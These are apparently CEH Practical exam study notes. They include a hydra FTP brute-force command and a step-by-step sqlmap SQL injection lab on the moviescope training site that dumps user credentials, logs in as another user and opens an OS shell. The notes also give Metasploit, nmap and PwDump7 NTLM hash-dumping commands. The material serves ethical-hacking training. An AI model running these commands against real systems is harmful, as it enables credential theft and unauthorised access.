# CEH-Practical-
All the required resources for CEH Practical exam Preparation


Resources:

https://docs.google.com/spreadsheets/d/e/2PACX-1vQWdEEN1oBeSKGjiCO0j6YUjouflX4yAxH7tsp7_vJzmOnNhYtFMEUveYmmoOAfd8MT1wayOYWimTI6/pubhtml#

https://github.com/ziyishen97/CEH-v11-Practical/blob/main/Practical%20Exam%20Notes.md

https://github.com/System-CTL/CEH_CHEAT_SHEET

https://github.com/TheCyberpunker/CEH-Practical-Notes/blob/main/8%20-%20CEH-Notes.md

https://github.com/Samsar4/Ethical-Hacking-Labs

For FTP brute force:

hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10] 

FOR SQL Injection:

3.	Before starting this lab assume that you are registered user in the http://www.moviescope.com website. And you want to crack the passwords of the other users from the database of the moviescope.
Open a web browser and type http://www.moviescope.com and press Enter in the address bar. Moviescope webpage appears, login into the Moviescope as Username: sam and Password: test@123 and click Login.
Once you are logged into the website click View Profile tab, and make a note of the URL in the address bar of the browser.
Right-click any where on the webpage and click Inspect Element (Q) from the context menu as shown in the screenshot.
 
4.	Developer Tools section appears as shown in the screenshot, click Console tab and type document.cookie in the lower left corner of the browser and press Enter.
 
5.	Select the cookie value and right-click and Copy the value as shown in the screenshot. Minimize the web browser.
 
6.	Click Terminal icon from the Favorites (left handside of the Desktop) to launch.
 
7.	Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> --dbs and press Enter.
By issuing the above query, sqlmap enforces various injection techniques on the name parameter of the URL in an attempt to extract the database information of moviescope website.
Do you want to skip test payloads specific for other DBMSes warning appears, type Y and press Enter.
Do you want to include all tests for ‘Micorsoft SQL Server’ extending provided level warning appears type Y and press Enter.
Do you want to keep testing the others warning appears, type N and press Enter.
Cookie value might vary in your lab environment.
 
8.	sqlmap retrieves the databases present in MS SQL Server. It also displays information about the web server operating system, web application technology and the back-end DBMS as shown in the screenshot.
 
9.	Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with moviescope database. Now type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> -D moviescope --tables and press Enter.
By issuing the above query, sqlmap starts scanning the moviescope database in search of tables located in the database.
 
10.	sqlmap retrieves the table contents of the moviescope database and displays them as shown in the screenshot.
 
11.	Now, you need to retrieve the columns associated with the tables. In this lab, you will use sqlmap to retrieve the columns of the table named "User_Login". For extracting columns information, you need to issue the following sqlmap query. Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> -D moviescope -T User_Login --columns and press Enter. By issuing the above query, sqlmap starts scanning the User_Login table inside moviescope database in search of columns.
 
12.	sqlmap retrieved the available columns in the above mentioned table i.e., User_Login as shown in the screenshot.
 
13.	Now type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> -D moviescope -T User_Login --dump and press Enter to dump the all User_Login table content
 
14.	Now the sqlmap has retrived the complete database of the moviescope which contains the Username and Passwords of the users as shown in the screenshot.
Make a note of any User credential, and minimize the terminal window. Now, we will verify the login credentials are valid. In this lab we are going to verify the login credentials of john.
 
15.	From the Favorites bar, click browser icon to maximize the browser. Close the Developer Console and click Logout in the moviescope page.
 
16.	Login page of moviescope appears, in the Username type john and in the Password type test and click Login.
You can enter any of the user credentials that you have gathered in the step #14.
 
17.	As you see in the screenshot we have successfully logged into the moviescope website with john’s account. Close the web browser window.
 
18.	Now, we are going to gain the access of the OS Shell of the victim machine. To do this maximize the sqlmap terminal window from the Favorites bar, and type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> --os-shell and press Enter.
 
19.	sqlmap tries to optimize value(s) for DBMS delay responses message appears type Y and press Enter to continue.
 
20.	Once sqlmap aquires the permission to optimize the machine, it will gives you with the os-shell. Type hostname and press Enter to find the machine name where the site is running.
 
21.	Do you want to retrieve the command standard output? message appears type Y and press Enter.
 
22.	Thus sqlmap will retrieves the hostaname as shown in the screenshot.
 
23.	Type ipconfig and press Enter to know the ip configuration the machine.
If do you want to retrieve the command standard output? message appears type Y and press Enter.
 
24.	On completing the lab exercise, exit all the applications and close all the files and folders that were opened during the lab.

Other:

Metasploit:

msfconsole
db_status 
msfdb init 
service postgresql restart 
nmap -Pn -sS -A -oX Test 10.10.10.0/24
db_import Test 

NTLM hashes:

wmic useraccount get name,sid 
PwDump7.exe > c:\hashes.txt 
